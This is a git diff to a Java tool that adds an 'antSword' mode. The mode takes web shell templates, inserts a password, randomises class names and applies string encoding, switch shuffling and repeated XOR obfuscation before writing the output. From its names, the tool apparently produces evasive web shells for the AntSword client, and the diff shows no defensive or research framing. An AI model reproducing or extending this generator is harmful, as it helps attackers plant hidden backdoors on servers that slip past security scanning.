@@ -3,7 +3,13 @@ package org.sec;
 import com.beust.jcommander.JCommander;
 import com.github.javaparser.StaticJavaParser;
 import com.github.javaparser.ast.CompilationUnit;
+import com.github.javaparser.ast.body.ClassOrInterfaceDeclaration;
+import com.github.javaparser.ast.body.ConstructorDeclaration;
 import com.github.javaparser.ast.body.MethodDeclaration;
+import com.github.javaparser.ast.expr.ArrayInitializerExpr;
+import com.github.javaparser.ast.expr.SimpleName;
+import com.github.javaparser.ast.expr.StringLiteralExpr;
+import com.github.javaparser.ast.type.ClassOrInterfaceType;
 import org.sec.input.Command;
 import org.sec.input.Logo;
 import org.sec.module.IdentifyModule;
@@ -11,10 +17,12 @@ import org.sec.module.StringModule;
 import org.sec.module.SwitchModule;
 import org.sec.module.XORModule;
 import org.sec.util.FileUtil;
+import org.sec.util.RandomUtil;
 import org.sec.util.WriteUtil;
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.util.List;
 
 
 @SuppressWarnings("all")
@@ -35,7 +43,7 @@ public class Main {
         if (command.javascript) {
             MethodDeclaration jsMethod = getMethod("JS.java");
             MethodDeclaration decMethod = getMethod("Dec.java");
-            if(jsMethod == null || decMethod == null){
+            if (jsMethod == null || decMethod == null) {
                 return;
             }
             String newValue = SwitchModule.shuffle(jsMethod);
@@ -55,11 +63,10 @@ public class Main {
             System.out.println("Finish!");
             return;
         }
-
-        if(command.superModule){
+        if (command.superModule) {
             MethodDeclaration superMethod = getMethod("Javac.java");
             MethodDeclaration decMethod = getMethod("Dec.java");
-            if(superMethod == null || decMethod == null){
+            if (superMethod == null || decMethod == null) {
                 return;
             }
             String newValue = SwitchModule.shuffle(superMethod);
@@ -77,6 +84,72 @@ public class Main {
 
             WriteUtil.writeSuper(superMethod, decMethod, password, useUnicode);
             System.out.println("Finish!");
+            return;
+        }
+        if (command.antSword) {
+
+            MethodDeclaration antMethod = getMethod("Ant.java");
+            MethodDeclaration antDecMethod = getMethod("AntDec.java");
+            MethodDeclaration decMethod = getMethod("Dec.java");
+            List<ClassOrInterfaceDeclaration> antClasses = getAntClass("Ant.java");
+            String antClassName = RandomUtil.getRandomString(10);
+
+            List<ArrayInitializerExpr> arrayExpr = antMethod.findAll(ArrayInitializerExpr.class);
+            StringLiteralExpr expr = (StringLiteralExpr) arrayExpr.get(0).getValues().get(1);
+            expr.setValue(command.password);
+
+            String antClassCode = null;
+            String antDecCode = null;
+            String antCode = null;
+            String decCode = null;
+
+            // Ant Class
+            for (ClassOrInterfaceDeclaration c : antClasses) {
+                if (!c.getNameAsString().equals("Ant")) {
+                    c.setName(antClassName);
+                    ConstructorDeclaration cd = c.findFirst(ConstructorDeclaration.class).get();
+                    cd.setName(antClassName);
+                    IdentifyModule.doConstructIdentify(cd);
+                    XORModule.doXORForConstruct(cd);
+                    c.findAll(MethodDeclaration.class).forEach(m -> {
+                                IdentifyModule.doIdentify(m);
+                                XORModule.doXOR(m);
+                                XORModule.doXOR(m);
+                            }
+                    );
+                    antClassCode = c.toString();
+                }
+            }
+            // Base64 Dec
+            int offset = StringModule.encodeString(antDecMethod);
+            StringModule.changeRef(antDecMethod, offset);
+            XORModule.doXOR(antDecMethod);
+            XORModule.doXOR(antDecMethod);
+            antDecCode = antDecMethod.toString();
+            // Ant Code
+            antMethod.findAll(ClassOrInterfaceType.class).forEach(ci->{
+                if(ci.getNameAsString().equals("U")){
+                    ci.setName(antClassName);
+                }
+            });
+            String newValue = SwitchModule.shuffle(antMethod);
+            SwitchModule.changeSwitch(antMethod, newValue);
+            int antOffset = StringModule.encodeString(antMethod);
+            StringModule.changeRef(antMethod, antOffset);
+            IdentifyModule.doIdentify(antMethod);
+            XORModule.doXOR(antMethod);
+            XORModule.doXOR(antMethod);
+            String antCodeTmp = antMethod.getBody().isPresent() ?
+                    antMethod.getBody().get().toString() : null;
+            antCode = antCodeTmp.substring(1, antCodeTmp.length() - 2);
+            // Dec Code
+            int decOffset = StringModule.encodeString(decMethod);
+            StringModule.changeRef(decMethod, decOffset);
+            IdentifyModule.doIdentify(decMethod);
+            XORModule.doXOR(decMethod);
+            decCode = decMethod.toString();
+
+            WriteUtil.writeAnt(antClassCode, antCode, antDecCode, decCode);
             return;
         }
 
@@ -110,6 +183,13 @@ public class Main {
         CompilationUnit unit = StaticJavaParser.parse(code);
         return unit.findFirst(MethodDeclaration.class).isPresent() ?
                 unit.findFirst(MethodDeclaration.class).get() : null;
+    }
+
+    private static List<ClassOrInterfaceDeclaration> getAntClass(String name) throws IOException {
+        InputStream in = Main.class.getClassLoader().getResourceAsStream(name);
+        String code = FileUtil.readFile(in);
+        CompilationUnit unit = StaticJavaParser.parse(code);
+        return unit.findAll(ClassOrInterfaceDeclaration.class);
     }
 }
 
